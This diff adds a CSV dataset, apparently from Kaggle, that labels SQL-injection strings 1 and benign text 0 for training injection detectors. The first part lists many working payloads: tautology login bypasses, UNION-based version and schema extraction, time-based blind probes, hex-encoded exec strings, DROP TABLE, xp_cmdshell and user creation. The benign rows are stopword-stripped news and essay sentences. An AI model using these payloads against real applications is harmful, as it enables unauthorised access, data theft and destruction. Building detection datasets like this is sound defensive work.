@@ -1,0 +1,1109 @@
+Sentence,Label,source
+' and 1 = 0 )  union all,1,kaggle
+1' or '1' = '1,1,kaggle
+1 and 1 = 1,1,kaggle
+1' and 1 =  ( select count ( * )  from tablenames ) ; --,1,kaggle
+1' and non_existant_table  =  '1,1,kaggle
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i,1,kaggle
+' or 1 = 1-- ,1,kaggle
+' -- ,1,kaggle
+""" or ""a"" = ""a",1,kaggle
+ )  union select * from information_schema.tables;,1,kaggle
+' or 1 in  ( select @@version ) --,1,kaggle
+' or 2 between 1 and 3,1,kaggle
+' -- &password = ,1,kaggle
+create user name identified by pass123 temporary tablespace temp default tablespace users; ,1,kaggle
+' ; drop table temp --,1,kaggle
+"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --",1,kaggle
+'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --,1,kaggle
+'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --,1,kaggle
+" select * from users where id = 1 or  ( \ )  = 1 union select 1,@@VERSION -- 1",1,kaggle
+" select * from users where id = 1 or  ( \. )  = 1 union select 1,@@VERSION -- 1",1,kaggle
+ select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1,1,kaggle
+" select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1",1,kaggle
+ select * from users where id = 1 or \.<1 or 1 = 1 -- 1,1,kaggle
+" select * from users where id = 1 or \.<\ union select 1,@@VERSION -- 1",1,kaggle
+" select * from users where id = 1 or \.<$ union select 1,@@VERSION -- 1",1,kaggle
+ select * from users where id = 1   or 1 = 1 -- 1,1,kaggle
+" select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1",1,kaggle
+" select * from users where id = 1 or \+<\ union select 1,@@VERSION -- 1",1,kaggle
+ select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1,1,kaggle
+" select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1",1,kaggle
+" select * from users where id = 1 or \<\ union select null,@@VERSION -- 1",1,kaggle
+ select * from users where id = 1 or !<@ or 1 = 1 -- 1,1,kaggle
+" select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1",1,kaggle
+" select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1",1,kaggle
+" select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1",1,kaggle
+" select * from users where id = 1.*\ union select null,@@VERSION -- 1",1,kaggle
+" select * from users where id = 1.<@$ union select 1,version (  )  -- 1",1,kaggle
+ select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1,1,kaggle
+ select * from users where id = 1 + \+%\ or 1 = 1 -- 1,1,kaggle
+" select * from users where id = 1 union select 1<@$,version (  )  -- 1",1,kaggle
+" select * from users where id = 1 union select 1 $$,version (  )  -- 1",1,kaggle
+" select * from users where id = 1 union select @&&@,version (  )  -- 1",1,kaggle
+" select * from users where id = 1 union select @ $$,version (  )  -- 1",1,kaggle
+" select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1,kaggle
+ select * from users where id = 1 % ( $ )  or 1 = 1 -- 1,1,kaggle
+" select * from users where id = 1 <@$_ union select 1,version (  )  -- 1",1,kaggle
+ select * from users where id = 1 <@<@ or 1 = 1 -- 1,1,kaggle
+" select * from users where id = '1' or  ( \ )  = 1 union select 1,@@VERSION -- 1'",1,kaggle
+" select * from users where id = '1' or \.<$ union select 1,@@VERSION -- 1'",1,kaggle
+" select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'",1,kaggle
+" select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'",1,kaggle
+" select * from users where id = 1 or "" ( 1"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or 1#"" (  union select 1,version (  )  -- 1",1,kaggle
+" select * from users where id = 1 or 1#"" (  union select 'a',version (  )  -- 1",1,kaggle
+" select * from users where id = 1 or "" ( &"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or "" ) ,"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or "" ) 1"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or "" ) ]"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or "" ) @"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or "", ) "" = 1 or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or "",."" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or 1#"", = 1 or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or "",&"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or "".]"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or ""._"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or "".{"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or ""1 ) "" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or ""1{"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or "";]"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or 1#""; union select 1,version (  )  -- 1",1,kaggle
+" select * from users where id = 1 or "";#"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or 1#""; = 1 union select 1,version (  )  -- 1",1,kaggle
+" select * from users where id = '1' union select "";""_,version (  )  -- 1'",1,kaggle
+" select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = '1' union select ""?""_,version (  )  -- 1'",1,kaggle
+" select * from users where id = '1' union select  ( \. ) ,@@VERSION -- 1'",1,kaggle
+" select * from users where id = '1' union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1'",1,kaggle
+" select * from users where id = 1 or ""$ ( "" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or ""$["" or 1 = 1 -- 1",1,kaggle
+ select * from users where id = '1' * ( \ )  or 1 = 1 -- 1',1,kaggle
+" select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'",1,kaggle
+" select * from users where id = 1 or ""%1"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'",1,kaggle
+" select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'",1,kaggle
+" select * from users where id = '1' + @ 1 union select 1,version (  )  -- 1'",1,kaggle
+" select * from users where id = 1 or ""%{"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or ""@ ( "" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or ""@;"" = 1 or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or 1#""@ union select version (  ) ,version (  )  -- 1",1,kaggle
+" select * from users where id = 1 or ""{ ( "" = 1 or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or ""{1"" = 1 or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or ""{?"" or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or @#""{ = 1 or 1 = 1 -- 1",1,kaggle
+" select * from users where id = 1 or @#""{ = 1 union select 1,version (  )  -- 1",1,kaggle
+" select * from users where id = 1 + @`\` union select 1,version (  )  -- 1",1,kaggle
+" select * from users where id = 1 -@<@ union select null,version (  )  -- 1",1,kaggle
+""" or """" """,1,kaggle
+""" or """"^""",1,kaggle
+""" or """"*""",1,kaggle
+""" or true--",1,kaggle
+""" )  or true--",1,kaggle
+' or 'x' = 'x,1,kaggle
+'  )  )   or   (  (  'x'  )  )   =   (  (  'x,1,kaggle
+or 1 = 1/*,1,kaggle
+admin' or '1' = '1'#,1,kaggle
+admin' or 1 = 1,1,kaggle
+"admin""/*",1,kaggle
+"admin"" or ""1"" = ""1""/*",1,kaggle
+"admin"" or 1 = 1--",1,kaggle
+"admin"" )  or  ( ""1"" = ""1""#",1,kaggle
+"admin"" )  or ""1"" = ""1",1,kaggle
+a' or 'a'  =  'a,1,kaggle
+declare @q nvarchar  ( 4000 )  select @q  = ,1,kaggle
+declare @s varchar ( 22 )  select @s  = ,1,kaggle
+0x77616974666F722064656C61792027303A303A31302700 exec ( @s ) ,1,kaggle
+declare @s varchar  ( 8000 )  select @s  =  0x73656c65637420404076657273696f6e,1,kaggle
+' or '' = ',1,kaggle
+' or 0 = 0 --,1,kaggle
+" or 0 = 0 #""",1,kaggle
+PRINT @@variable,1,kaggle
+select,1,kaggle
+insert,1,kaggle
+' or username like '%,1,kaggle
+' or uname like '%,1,kaggle
+'; exec xp_regread,1,kaggle
+t'exec master..xp_cmdshell 'nslookup www.google.com'--,1,kaggle
+'  ( select top 1,1,kaggle
+'||UTL_HTTP.REQUEST,1,kaggle
+*/*,1,kaggle
+‘ or 3 = 3 --,1,kaggle
+ )  or  ( 'x' = 'x,1,kaggle
+"1  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #",1,kaggle
+""" or benchmark ( 10000000,MD5 ( 1  )  )  #",1,kaggle
+# from wapiti,1,kaggle
+ or 'a' = 'a,1,kaggle
+ UNION ALL SELECT,1,kaggle
+1 or sleep ( __TIME__ ) #,1,kaggle
+"1 )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1,kaggle
+"""  )  )  ;waitfor delay '0:0:__TIME__'--",1,kaggle
+ or '' = ',1,kaggle
+0x77616974666F722064656C61792027303A303A313027 ...,1,kaggle
+ )  or pg_sleep ( __TIME__ ) --,1,kaggle
+ having 1 = 1--,1,kaggle
+0x730065006c0065006300740020004000400076006500 ...,1,kaggle
+ or 'x' = 'x,1,kaggle
+ or 'something'  =  'some'+'thing',1,kaggle
+""" )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1,kaggle
+declare @s varchar ( 200 )  select @s  =  0x77616974666F722064656C61792027303A303A31302700 exec ( @s )  ,1,kaggle
+declare @s varchar  ( 200 )  select @s  =  0x73656c65637420404076657273696f6e exec ( @s ) ,1,kaggle
+" Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late",0,kaggle
+" Epilogue Beaumont Fletcher’s Honest Man’s Fortune Cast bantling rocks, Suckle she-wolf’s teat; Wintered hawk fox, Power speed hands feet",0,kaggle
+" Speak latent conviction, shall universal sense; inmost due time becomes outmost, — first thought rendered back us trumpets Last Judgment",0,kaggle
+ In every work genius recognize rejected thoughts: come back us certain alienated majesty,0,kaggle
+ They teach us abide spontaneous impression good-humored inflexibility whole cry voices side,0,kaggle
+" Not nothing one face, one character, one fact, makes much impression him, another none",0,kaggle
+" We half express ourselves, ashamed divine idea us represents",0,kaggle
+" Great men always done so, confided childlike genius age, betraying perception absolutely trustworthy seated heart, working hands, predominating being",0,kaggle
+" Infancy conforms nobody: conform it, one babe commonly makes four five adults prattle play it",0,kaggle
+" But man is, were, clapped jail consciousness",0,kaggle
+" Ah, could pass neutrality! Who thus avoid pledges, observed, observe unaffected, unbiased, unbribable, unaffrighted innocence, must always formidable",0,kaggle
+" He would utter opinions passing affairs, seen private, necessary, would sink like darts ear men, put fear",0,kaggle
+" Society joint-stock company, members agree, better securing bread shareholder, surrender liberty culture eater",0,kaggle
+ Self-reliance aversion,0,kaggle
+" Good bad names readily transferable this; right constitution, wrong it",0,kaggle
+" A man carry presence opposition, every thing titular ephemeral he",0,kaggle
+" I ought go upright vital, speak rude truth ways",0,kaggle
+" I would write lintels door-post, Whim",0,kaggle
+" I hope somewhat better whim last, cannot spend day explanation",0,kaggle
+ Expect show cause I seek I exclude company,0,kaggle
+" I much prefer lower strain, genuine equal, glittering unsteady",0,kaggle
+" And, course, much force withdrawn proper life",0,kaggle
+ A man must consider blindman’s-buff game conformity,0,kaggle
+ I hear preacher announce text topic expediency one institutions church,0,kaggle
+" Their two real two, four real four; every word say chagrins us, know begin set right",0,kaggle
+" If aversation origin contempt resistance like own, might well go home sad countenance; sour faces multitude, like sweet faces, deep cause, put wind blows newspaper directs",0,kaggle
+" But keep head shoulder? Why drag corpse memory, lest contradict somewhat stated public place? Suppose contradict yourself; then? It seems rule wisdom never rely memory alone, scarcely even acts pure memory, bring past judgment thousand-eyed present, live ever new day",0,kaggle
+" In metaphysics denied personality Deity: yet devout motions soul come, yield heart life, though clothe God shape color",0,kaggle
+ He may well concern shadow wall,0,kaggle
+ We pass are,0,kaggle
+ One tendency unites all,0,kaggle
+" Your genuine action explain itself, explain genuine actions",0,kaggle
+ All foregone days virtue work health this,0,kaggle
+" That throws thunder Chatham’s voice, dignity Washington’s port, America Adams’s eye",0,kaggle
+" Let us affront reprimand smooth mediocrity squalid contentment times, hurl face custom, trade, office, fact upshot history, great responsible Thinker Actor working wherever man works; true man belongs time place, centre things",0,kaggle
+" Where is, nature",0,kaggle
+ One conduct transition actions parsing followed punctuation predictions cascaded way,0,kaggle
+ The period word menu predicted parsing adverbial clause modifier (advcl) completed,0,kaggle
+" In decoding, beam search used get optimal punctuation prediction results",0,kaggle
+ We conduct experiments IWSLT data TDT4 test data sets,0,kaggle
+ The experimental results show method achieve higher performance CRF-based baseline method,0,kaggle
+" (2001), Liu et al",0,kaggle
+ (2006) use rich set non-local features including parser scores re-rank full segmentations,0,kaggle
+ (2008) integrate syntactic information PCFG parser log-linear combine local features sentence segmentation,0,kaggle
+" The punctuation prediction works performed post-procedure step parsing, parse tree needs built advance",0,kaggle
+", 2006b; Zhang Clark, 2008; Huang Sagae, 2010)",0,kaggle
+", 2011; Bohnet Nivre, 2012)",0,kaggle
+ The former usually works well-formed single sentence latter needs process multiple sentences lengthy,0,kaggle
+" He Kerr still love , emphasised 36-year-old ",0,kaggle
+ &quot; We &apos;re going support one another love parents Flynn &quot; ,0,kaggle
+ How back plane laid - particularly whether seating 9 10 abreast - central economic performance claims made new &quot; mini-jumbo &quot; jet designs ,0,kaggle
+ Airbus says competing version A350 carry 350 people 18-inch-wide economy seat laid 9 abreast ,0,kaggle
+" As diets change , people get bigger plane seating radically changed ",0,kaggle
+ Health Department Data ,0,kaggle
+ They &apos;t want us dictate makes profitable ,0,kaggle
+" For flyers elbow room , suppliers increasingly issue could affect earnings ",0,kaggle
+ European exports ,0,kaggle
+ Boeing &apos;s performance claims depend part comparing 10-abreast 777X original 9-abreast 777 design ,0,kaggle
+" Until recently , Airbus stressing need cabin customization offering wider aisle seats jets ",0,kaggle
+" Without support maker large modern jets , experts say call new industry standard unlikely fly , could distract wave 777X sales ",0,kaggle
+ The FAA easing restrictions use electronic gadgets airplanes - though chatting cellphones still prohibited ,0,kaggle
+" Warplanes attack store Russian missiles port city Latakia , official says ",0,kaggle
+ Rather rattled U,0,kaggle
+" government shutdown , investors kept focus probably matters more: Federal Reserve ",0,kaggle
+" Persons seriously injured following collision Early Friday afternoon , two car drivers seriously injured head-on collision Landesstraße 44 (a rural road)",0,kaggle
+ A Technical Rescue Team Cleckheaton Fire Station rushed scene abseiled rescue Ruby used pet tube transport cliff ,0,kaggle
+ But fine ,0,kaggle
+ She eating biscuits afterwards ,0,kaggle
+ The firefighters amazing ,0,kaggle
+ It really daring ,0,kaggle
+ We grateful every single one absolutely tremendous ,0,kaggle
+ &quot; The firefighters brilliant ,0,kaggle
+" In clubhouse &quot; Witteborg &quot; Inn Dinker , present enjoyed friendly get-together name music ",0,kaggle
+" The awards participation performances choir rehearsals means presentation &quot; activity posies &quot; , year went Choir Director Dieter Schulze , 44 attendance marks , followed Honorary Chairman Horst Pier-Ribbert , Chairman , last year &apos;s &quot; Singer Year &quot; Friedrich Winkler , attended 42 times ",0,kaggle
+" Fifth place went Artur Brückner , responsible organising music copies ",0,kaggle
+" &quot; New voices love sing welcome time , &quot; said Schlotmann ",0,kaggle
+" NSA revelations boost corporate paranoia state surveillance On mild day late August German police helicopter buzzed low US consulate Frankfurt , financial capital Germany ",0,kaggle
+" On instruction Office Protection Constitution (BfV), Germany &apos;s domestic intelligence agency , mission photograph rooftop US outpost , located less 5km European Central Bank Bundesbank ",0,kaggle
+ Reports US National Security Agency spied Brazilian oil company Petrobras gained access data held US cloud providers including Google Yahoo ratcheted corporate paranoia state surveillance new highs ,0,kaggle
+ Politicians expressed concern EU lacks certain IT internet capabilities strive reduce dependence US ,0,kaggle
+ I shut eyes slowly open ,0,kaggle
+" According survey carried Cloud Security Alliance , trade body , 10 per cent non-US members cancelled plans use US-based cloud provider revelations US Prism data mining programme ",0,kaggle
+" The Americans spy us commercial industrial level spy , national interest defend businesses ",0,kaggle
+ Germany &apos;s BfV advises executives consider using simple prepaid mobiles foreign trips risk smart phones compromised ,0,kaggle
+ Häußler made clear: &quot; The final decisions made members Town Council &quot; ,0,kaggle
+ Climate change taken account form allowance 15 per cent ,0,kaggle
+" The masses water caused considerable damage Gechingen 2009 equivalent 1,000-year flood ",0,kaggle
+" However , Häußler indicated funding would provided overall concept developed ",0,kaggle
+" Among measures , protection concept , (we reported) already presented Town Council past week , plans local measures tributary River Irm , running Stammheim Valley ",0,kaggle
+" In conjunction presentation flood protection concept , participants made use opportunity submit concerns ",0,kaggle
+" &quot; The Government come emergency rescue package believe address unique challenges faced state , &quot; Ms Plibersek said today ",0,kaggle
+" &quot; I &apos;m hopeful federal assistance package go long way towards taking state &apos;s public health system critical list , &quot; Mr Wilkie said ",0,kaggle
+ You &apos;t state government ripping almost half-a-billion dollars Commonwealth put $ 300 million pretend &apos;s good news day ,0,kaggle
+" Mozambique security concerns mount powerful personalities clash With statue Samora Machel , Mozambique &apos;s founding president , staring , thousands people gathered central Maputo chant peace slogans rare public demonstration ",0,kaggle
+" &quot; We want peace back; want stability , &quot; said Vanessa de Sousa , chief executive investment company ",0,kaggle
+" After 1992 peace deal , became opposition party ",0,kaggle
+" The ruling Frelimo party , dominant political force since 1975 , Renamo blame tension ",0,kaggle
+ Neither good negotiators neither prepared make kind concessions necessary ,0,kaggle
+" It unclear much capacity Renamo , carried disruptive hit-and-run attacks police stations vehicles key north-south highway ",0,kaggle
+" In June , Rio suspended use railway week Renamo threatened attack line ",0,kaggle
+" Renamo wanted &quot; warn international community things going well Mozambique , &quot; Mr Mazanga said ",0,kaggle
+" From 2015 , pupils required take standalone GCSE language , strong incentives choose English literature separate qualification ",0,kaggle
+" When year comes end eight weeks , anniversary year upon us ",0,kaggle
+ Geisingen Kirchen-Hausen first documented together year 794 ,0,kaggle
+" On 15 March , anniversary year officially launched , Geisingen currently suitable venues , launch event take place location two towns first documented 1,250 years ago , Kirchen-Hausen ",0,kaggle
+" Kirchen-Hausen celebrate 1,250th anniversary celebratory weekend 18 20 July ",0,kaggle
+" On Friday ceremony , Saturday Sunday party held Kirchtalhalle ",0,kaggle
+" This venue completed inaugurated anniversary year , official date set last weekend September , 27 28 September ",0,kaggle
+ Both communities thus mentioned deed ,0,kaggle
+ The suit block law brought 26 states National Federation Independent Business ,0,kaggle
+ Thought travel agents thing past thanks internet ? Flight Centre seem bucking trend ,0,kaggle
+ If current guidance achieved represent 12 17 per cent growth record $ 290,0,kaggle
+ Its US business recovered losses seasonally weaker first half expected deliver third consecutive full year profit ,0,kaggle
+" Unsure , government Jerusalem officially confirmed attack ",0,kaggle
+ He buried deceased forest - continued collect pension care allowance ,0,kaggle
+ According Green Party MP ,0,kaggle
+ Unknown attackers injure girl shots fired car Unknown attackers injured twelve-year-old girl Saxony-Anhalt firing shots car ,0,kaggle
+ The girl suffered minor injury left calf ,0,kaggle
+" The Criminal Investigation Department investigating matter , stated Friday ",0,kaggle
+" In addition , cleaned widened footpath , press release announced ",0,kaggle
+ In wanted point danger even bigger ruins Schweizer Wiese - huge project one day fail ,0,kaggle
+" As result , important collaboration developed gynaecologist , Hanne , performed countless operations several journeys location ",0,kaggle
+" Rainer Prewo , former Lord Mayor Nagold , made suggestion equipping vehicle photovoltaic system , according Henne , planning assume advisory role within organisation ",0,kaggle
+" You learn great deal working doctor Africa , said Henne , example slow avoid burn-out ",0,kaggle
+ Africa far Gran Canaria ,0,kaggle
+" &quot; While considerable evidence many different mammals two sides brain used different purposes , much detail still hammered - dogs exception , &quot; said ",0,kaggle
+ He still accused passing secret information without authorisation ,0,kaggle
+ Even recent statements Snowden change fact ,0,kaggle
+" Following recent meeting Snowden Moscow , German Green Party politician Hans-Christian Ströbele appealed USA continue threaten prosecution ",0,kaggle
+ Bird airlifted safety North Sea rig released back wild A bird airlifted ashore found exhausted North Sea oil rig released back wild ,0,kaggle
+ The water rail put helicopter Aberdeen last month nursed back health Scottish SPCA rescue centre Alloa ,0,kaggle
+ Centre manager Colin Seddon said: &quot; This water rail likely winter migrant Northern Europe got caught strong winds North Sea ,0,kaggle
+ Another line taken surface hydrant around 100 metres away ,0,kaggle
+ Georges Bwelle one top 10 CNN Heroes 2013 ,0,kaggle
+ You leave home 5 a,0,kaggle
+m,0,kaggle
+ There lot patients ,0,kaggle
+" In Cameroon , one doctor every 5,000 people , according World Health Organization ",0,kaggle
+ Georges Bwelle team volunteers performed 700 free surgeries past year ,0,kaggle
+" And started nonprofit , ASCOVIME , travels rural areas weekends provide free medical care ",0,kaggle
+" But arrive , receive true heroes &apos; welcome: feast , singing dancing , best accommodations community offer ",0,kaggle
+" The next morning , team begins meeting hundreds patients ",0,kaggle
+" Many people treated malaria , tuberculosis , malnutrition , diabetes , parasites sexually transmitted diseases ",0,kaggle
+" Operations usually done schoolhouse , town hall home; procedure , patients get walk recovery area make way next person ",0,kaggle
+" With group &apos;s generator lighting operating room sanitizing equipment , Bwelle volunteers work early hours Sunday morning ",0,kaggle
+" &quot; They beating drums night keep us awake continue work , &quot; Bwelle said ",0,kaggle
+ &quot; We &apos;ve able scrub surgeries help blot blood away hold tools Dr,0,kaggle
+" But arrive Yaounde , board , transportation instruction covered Bwelle ",0,kaggle
+" &quot; He &apos;s hero , without doubt , &quot; O &apos;Malley said ",0,kaggle
+ Endurance pays dividends Six teams battled become champion club tennis tournament ,0,kaggle
+" Five matches scheduled team , every team playing one match others ",0,kaggle
+" The matches doubles matches long set nine points , maximum duration 45 minutes ",0,kaggle
+" After first three matches lunch break pasta , tournament moved crucial phase ",0,kaggle
+"5 billion , sued Samsung Electronics Co Ltd , HTC Corp , Huawei four companies patent infringement U",0,kaggle
+" Representatives Samsung , Huawei , HTC Rockstar could immediately reached ",0,kaggle
+" Should mother alarmed daughter begins sprout breast buds pubic hair 7 8 ? At annual conference American Academy Pediatrics week Orlando , Florida , pediatric endocrinologist Dr",0,kaggle
+" In United States , average age 12",0,kaggle
+"5 years , 12",0,kaggle
+" &quot; Once breasts begin develop , takes least two three years menarche , &quot; said Kaplowitz , also author &quot; Early Puberty Girls: The Essential Guide Coping This Common Problem ",0,kaggle
+ There treatments delay early menses ward another consequence: premature aging bones ultimately lead stunted growth short adult ,0,kaggle
+" Psychosocial aspects important , ",0,kaggle
+" Yet , &apos;s consistent body evidence hormones milk foods , chemicals environment sexual messages media blame ",0,kaggle
+ He helped conduct 2001 study 6- 9-year-old girls links body fat timing puberty ,0,kaggle
+" Other findings support conclusion , many contributing factors ",0,kaggle
+" Globally , patterns early puberty appear influenced everything economic conditions climate genes ",0,kaggle
+" Another conundrum: Although boys getting facial pubic hair younger ages , trend toward full-blown early puberty pronounced girls ",0,kaggle
+" Lawrence Silverman , pediatric endocrinologist Goryeb Children &apos;s Hospital Morristown , New Jersey ",0,kaggle
+" &quot; It may mean sooner-than-expected conversation , &quot; Kaplowitz advised ",0,kaggle
+ They 32 men later jailed police seized heroin cocaine worth £ 1,0,kaggle
+"5million along £ 200,000 cash series raids ",0,kaggle
+" But court heard would call major players drugs supply chain , previously represented , key arrests tell detectives knew ",0,kaggle
+" He got close certain clients , particular Scarborough , allowed independence compromised ",0,kaggle
+" On website Ditta gave question answer session says fantasy job would lawyer representing clients Death Row America , ultimate dinner guest Mohammed Ali inequality motivation work ",0,kaggle
+" US-Mexico drug tunnel railway found One sophisticated drug smuggling tunnels USA Mexico found , complete lighting , ventilation electric rail systems ",0,kaggle
+ US authorities described four foot three foot tunnel one sophisticated secret passages ever discovered ,0,kaggle
+" The tunnel shut drugs made undetected , authorities said ",0,kaggle
+ They face prison sentences 10 years life imprisonment convicted ,0,kaggle
+" In Nogales , Arizona , smugglers tap vast underground drainage canals ",0,kaggle
+ The tunnel eighth major passage discovered San Diego since 2006 ,0,kaggle
+ Frontier Airlines charge carry-on baggage Frontier Airlines plans charge $ 100 passengers store carry-on luggage board flight ,0,kaggle
+" The new carry-on fee bags overhead bin , small bags seat still free ",0,kaggle
+ Airlines began charging first second checked bags 2008 ,0,kaggle
+ Fees one way get passengers bring less board ,0,kaggle
+" Most &apos;t touched carry-on bag fees , though ",0,kaggle
+" started first carry-on fee three years ago , fellow discounter Allegiant Air later followed ",0,kaggle
+ I expecting see gnashing teeth fight breaking gate ,0,kaggle
+" &quot; Frontier also following Spirit &apos;s $ 2 charge coffee , tea , soda , juice ",0,kaggle
+" Frontier said passengers get soda juice keep whole , give coffee refills free ",0,kaggle
+ It still give away water ,0,kaggle
+ On Wednesday slashed mileage award 25 percent miles trip ,0,kaggle
+" Revenue dropped 9 percent flying capacity shrank almost 13 percent first quarter , according financial results released Wednesday corporate parent Republic Airways Holdings Inc ",0,kaggle
+" Since 2006 , 77,000 people killed conjunction drug crime Mexico ",0,kaggle
+ The tunnel cross-section measuring 1,0,kaggle
+ Two suspects detained conjunction cocaine find ,0,kaggle
+" The third , Mexican , detained due seizure marijuana ",0,kaggle
+" Ben Greenman: The Tenth Anniversary New York Comedy Festival: The New Yorker One could argue New York City birthplace standup comedy America: nearly hundred years ago , vaudevillian Frank Fay , served master ceremonies Palace Theatre , Broadway , started telling jokes directly crowd , conversational manner ",0,kaggle
+" &quot; Most headliners appeared Carolines , went greater success , point &apos;re big play club , &quot; Hirsch said ",0,kaggle
+" He telling , &apos;s , sometimes &apos;ll walk alley two buildings think , Hey , I lose money , maybe I &apos;ll live ",0,kaggle
+" Stevie Rochelle Bamford initially found guilty Phuket provincial court June 15 making false claims telling Thai police local taxi driver , two men restraining , carried assault early hours Sunday June 10 ",0,kaggle
+" However , CCTV footage later revealed returned hotel safely becoming separated Australian boyfriend ",0,kaggle
+" She daughter former Australian league player Peter Tunks , appealed Department Foreign Affairs Canberra assist daughter ",0,kaggle
+ Tunks told Sydney &apos;s Sunday Telegraph whole family &quot; extremely concerned &quot; daughter &apos;s welfare wanted back Australia ,0,kaggle
+" Bombardier profit dips plane deliveries , orders fall Canadian plane train maker Bombardier Inc reported 15 percent fall net profit Thursday , pressured fewer aircraft orders deliveries third quarter contract issues train unit ",0,kaggle
+" After test plane &apos;s inaugural flight month half ago , flown three times , raising questions whether testing phase track ",0,kaggle
+ Results fell short forecasts sent shares sliding 8 percent Toronto Stock Exchange ,0,kaggle
+" Cameron Doerksen , analyst National Bank Financial , lowered rating &quot; sector perform &quot; &quot; outperform &quot; Thursday view stock limited upside next one two quarters ",0,kaggle
+" &quot; While weaker aircraft deliveries mostly anticipated , clearly disappointed margin performance transportation , &quot; Doerksen said client note ",0,kaggle
+ That happen flight program ,0,kaggle
+" For third quarter ended September 30 , Bombardier &apos;s net profit fell $ 147 million , 8 cents per share , $ 172 million , 9 cents per share year earlier ",0,kaggle
+ Adjusted earnings per share unchanged 9 cents ,0,kaggle
+" Net orders fell 26 aircraft , 83 ",0,kaggle
+"9 billion September 30 , unchanged December 31 ",0,kaggle
+ The transportation division &apos;s margins affected execution issues large contracts ,0,kaggle
+ Executives said new guidance would provided fourth quarter ,0,kaggle
+" Brazil &apos;s Embraer SA , world &apos;s third-largest commercial planemaker Bombardier &apos;s closest rival , reported 10 percent fall quarterly profit Thursday ",0,kaggle
+" Under new bill , media houses fined 20 million Kenyan shillings individual journalists one million additional risk &quot; de-listed , &quot; barred receiving official press accreditation ",0,kaggle
+" &quot; Left , politicians would bankrupt country take us back hunting gathering , &quot; wrote ",0,kaggle
+" Already stamp duty take residential property boroughs Westminster Kensington &amp; Chelsea , stood £ 708 million 2012 / 13 tax year , exceeds combined total Northern Ireland , Wales , Scotland , North East , North West Yorkshire Humber put together ",0,kaggle
+" Mr Cook said: &quot; Following increases stamp duty high value homes introduction associated anti-avoidance legislation , difficult argue high value property under-taxed irrespective effect out-dated council tax system ",0,kaggle
+8% past year ,0,kaggle
+"5%) experiencing uptick , according research Savills ",0,kaggle
+ When asked views specific policy areas - ranging monopoly regulation product laws - majority business leaders thought control key competences returned Westminster ,0,kaggle
+ The stakes high - achieving treaty change better deal Britain sees 16 per cent swing towards voting stay EU referendum ,0,kaggle
+" The priority must jobs growth Britain , findings poll show , business means renewed focus trade fundamental change Brussels &quot; regulatory approach ",0,kaggle
+ Clive Palmer claims PM Tony Abbott conflict interest parental leave scheme Billionaire MP Clive Palmer says Prime Minister Tony Abbott conflict interest parental leave scheme daughters might get pregnant benefit ,0,kaggle
+ Mr Palmer called overhaul election counting speed process ,0,kaggle
+ Tony Abbott &apos;s daughters Frances Bridget ,0,kaggle
+ The Electoral Commission studying options electronic voting recently released joint discussion paper New Zealand ,0,kaggle
+" In , postal service miles mark comes public accessibility ",0,kaggle
+ 11 stuck upright mat propped behind bleachers inside high school gym ,0,kaggle
+" &quot; They absolutely think son murdered , &quot; Benjamin Crump , attorney representing Kenneth Jacquelyn Johnson , told FoxNews",0,kaggle
+ My objective discovery truth ,0,kaggle
+" &quot; A second autopsy , however , listed different cause death , according Moore ",0,kaggle
